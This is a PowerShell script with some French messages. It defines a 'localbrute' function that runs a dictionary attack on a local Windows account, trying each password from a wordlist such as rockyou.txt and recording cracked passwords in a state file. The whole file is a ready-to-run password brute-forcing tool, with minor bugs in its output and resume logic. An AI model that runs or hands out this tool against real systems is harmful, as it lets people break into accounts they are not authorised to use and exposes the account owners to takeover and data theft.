Function localbrute {
    param($u, $dct, $debug)

    $name = Get-LocalUser | Select-Object -ExpandProperty Name
    $userExists = $false
    foreach($i in $name) {
        if ($i -eq $u) {
            $userExists = $true
            Write-Output Write-Output "L'utilisateur $i existe parmi les utilisateurs locaux."
        }
    }

    if (-not $userExists) {
        Write-Output "L'utilisateur $u n'existe pas parmi les utilisateurs locaux."
        return
    }

    $d = $dct -replace ".*\\" -replace ".*/"

    $index = (Get-Content .\localbrute.state | Where-Object { $_ -match "^${u}:${d}:" } | Select-Object -Last 1 -ErrorAction SilentlyContinue) -split ":" | Select-Object -Index 2
    if ($index) {
        Write-Output "Password for $u account already found: $index"
        return
    }

    $index = 0

    $dictionary = [System.IO.File]::ReadLines($dct)

    $dictionary | ForEach-Object -Begin { $i = 0 } -Process {
        $password = $_
        if ($i -ge $index) {
            if ($debug) { Write-Output "DEBUG: trying password [${i}]: $password" }
            try {
                Add-Type -AssemblyName System.DirectoryServices.AccountManagement
                $contextType = [DirectoryServices.AccountManagement.ContextType]::Machine
                $principalContext = [DirectoryServices.AccountManagement.PrincipalContext]::new($contextType)
                if ($principalContext.ValidateCredentials($u, $password)) {
                    Write-Output "${u}:${d}:True:${password}" >> localbrute.state
                    Write-Output "Password for $u account found: $password"
                    break
                    #return
                }
            } catch {

            }
        }
        $i++
    }

    Write-Output "${u}:${d}:${i}:${password}" >> localbrute.state
}
# Exemple localbrute -u "admin" -dct "rockyou.txt" $true
localbrute -u "" -dct "" -debug $true
